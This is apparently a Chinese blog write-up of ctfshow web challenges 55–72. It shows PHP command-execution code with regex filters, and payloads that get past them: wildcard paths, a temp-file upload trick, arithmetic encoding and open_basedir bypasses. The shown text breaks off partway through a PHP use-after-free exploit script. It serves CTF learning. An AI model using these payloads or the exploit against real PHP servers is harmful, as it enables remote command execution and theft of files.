<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">grep <span class="keyword">test</span> *<span class="keyword">file</span>   #在当前目录中，查找后缀有 <span class="keyword">file</span> 字样的文件中包含 <span class="keyword">test</span> 字符串的文件，并打印出该字符串的行</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">payload:</span><span class="string">?c</span>=grep<span class="variable">$&#123;</span>IFS&#125;%<span class="number">27</span>&#123;%<span class="number">27</span><span class="variable">$&#123;</span>IFS&#125;fl?<span class="string">??</span>php</span><br><span class="line">意思就是在 fl?<span class="string">??</span>php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行</span><br></pre></td></tr></table></figure>




<h2 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">先放<span class="symbol">payload:</span> <span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">??</span><span class="number">64</span>%<span class="number">20</span>?<span class="string">??</span><span class="string">?.</span><span class="string">??</span>?</span><br></pre></td></tr></table></figure>

<p><strong>bin目录:</strong> </p>
<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p>
<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
<p>得到如下：</p>
<p><img src="http://img.npfs06.top/20210225161321.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64解密，即可得到flag</p>
<p>看了羽大佬的WP还有一种解法</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">如下：payload：<span class="string">?c</span>=<span class="regexp">/???/</span><span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="number">2</span> <span class="string">??</span><span class="string">??</span>.<span class="string">??</span>?      ---》 然后在url + <span class="regexp">/flag.php.bz2</span></span><br></pre></td></tr></table></figure>

<p><strong>/usr/bin目录:</strong></p>
<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p>
<p>我们可以利用/usr/bin下的<strong>bzip2</strong></p>
<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
<h2 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很有趣的一道题，学到里奥新姿势，P神文章奉上<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank">无字母数字webshell之提高篇</a></p>
<p>该题主要就是用P神文章里讲的方法来做的</p>
<p>首先构造一个post上传文件的数据包</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传一个php文件，文件内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
<p><img src="http://img.npfs06.top/20210225161339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>上传抓包</p>
<p>抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令</p>
<p><img src="http://img.npfs06.top/20210225161351.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>注：这里为什么要传参数，以及参数内容为什么是  .%20/???/????????[@-[] ,P神的文章已经写的很详细了</p>
<p><img src="http://img.npfs06.top/20210225161405.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210225161419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之</p>
<p>可以看到flag.php文件，</p>
<p><img src="http://img.npfs06.top/20210225161433.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>用cat命令读取文件即可</p>
<h2 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmmmmmmm 不会</p>
<p>payload奉上：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>


<p><img src="http://img.npfs06.top/20210225161449.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-58-65"><a href="#web-58-65" class="headerlink" title="web 58-65"></a>web 58-65</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">c</span>=echo highlight_file(<span class="string">&#x27;flag.php&#x27;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">c</span>=show_source(<span class="string">&quot;flag.php&quot;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">c</span>=highlight_file(<span class="string">&quot;flag.php&quot;</span>)<span class="comment">;  </span></span><br></pre></td></tr></table></figure>




<h2 id="web-66"><a href="#web-66" class="headerlink" title="web 66"></a>web 66</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码没变，里头东西变了</p>
<p>首先 c=print_r(scandir(“/“)); 查看目录结构，发现flag.txt</p>
<p><img src="http://img.npfs06.top/20210225161501.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>payload：c=highlight_file(“/flag.txt”);</p>
<h2 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h2><p>emmmm.  print_r被禁了，换成 var_dump即可，做法同上</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">payload</span>：<span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
<h2 id="web-68-70"><a href="#web-68-70" class="headerlink" title="web 68-70"></a>web 68-70</h2><p>文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>

<h2 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p> $s = ob_get_contents();//得到缓冲区的数据。<br> ob_end_clean();//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。</p>
<p>可以利用exit9);停止后面的程序</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">payload：c=require(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<h2 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">绕过open_basedir</span><br><span class="line"><span class="comment">#poc</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//通过这个发现flag在flag0.txt</span></span><br><span class="line"><span class="comment">//之后利用uaf的脚本进行命令执行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span><span class="number">-1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span 